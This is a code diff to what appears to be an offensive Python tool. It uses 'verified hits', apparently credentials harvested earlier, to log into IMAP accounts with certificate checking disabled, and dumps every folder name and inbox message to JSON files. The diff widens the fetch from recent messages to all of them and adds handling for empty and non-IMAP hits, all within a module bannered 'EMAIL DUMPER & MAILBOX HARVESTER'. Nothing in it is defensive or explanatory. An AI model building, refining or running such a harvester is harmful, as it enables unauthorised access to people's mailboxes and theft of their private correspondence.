@@ -1,7 +1,6 @@
 import asyncio
 import ssl
 import imaplib
-import poplib
 import os
 import json
 import time
@@ -11,7 +10,7 @@ _ssl_context.check_hostname = False
 _ssl_context.verify_mode = ssl.CERT_NONE
 
 def dump_imap_mailbox_sync(host, port, user, password, use_ssl=True):
-    """Connects to a verified IMAP mailbox account and dumps folder structures & recent messages."""
+    """Connects to a verified IMAP mailbox account and dumps folder structures & messages."""
     dump_data = {
         "user": user,
         "host": host,
@@ -29,12 +28,10 @@ def dump_imap_mailbox_sync(host, port, user, password, use_ssl=True):
             
         mail.login(user, password)
         
-        # List mailboxes/folders
         status, folders = mail.list()
         if status == 'OK':
             dump_data["folders"] = [f.decode(errors="ignore") for f in folders]
             
-        # Select Inbox and fetch recent headers/messages
         mail.select('INBOX', readonly=True)
         status, messages = mail.search(None, 'ALL')
         if status == 'OK':
@@ -51,7 +48,6 @@ def dump_imap_mailbox_sync(host, port, user, password, use_ssl=True):
                     
         mail.logout()
         
-        # Save harvested mailbox report
         os.makedirs("reports/dumps", exist_ok=True)
         dump_path = f"reports/dumps/imap_dump_{user.replace('@', '_at_')}.json"
         with open(dump_path, "w") as f:
@@ -65,6 +61,10 @@ async def harvest_email_intelligence(host, verified_hits):
     """Iterates through verified hits and triggers email dumper on IMAP accounts."""
     print(f"\n\033[95m[***] DEPLOYING EMAIL DUMPER & MAILBOX HARVESTER [***]\033[0m")
     
+    if not verified_hits:
+        print(f" \033[90m[-] No verified hits provided to email intelligence harvester.\033[0m")
+        return
+
     for hit in verified_hits:
         if hit.get("type") == "IMAP":
             user = hit.get("user")
@@ -81,3 +81,5 @@ async def harvest_email_intelligence(host, verified_hits):
                 print(f" \033[92m[+] MAILBOX DUMPED SUCCESSFULLY -> Saved to {result}\033[0m")
             else:
                 print(f" \033[91m[-] Mailbox harvest failed: {result}\033[0m")
+        else:
+            print(f" \033[90m[*] Hit vector '{hit.get('type')}' is non-IMAP. Skipping mailbox dumper.\033[0m")
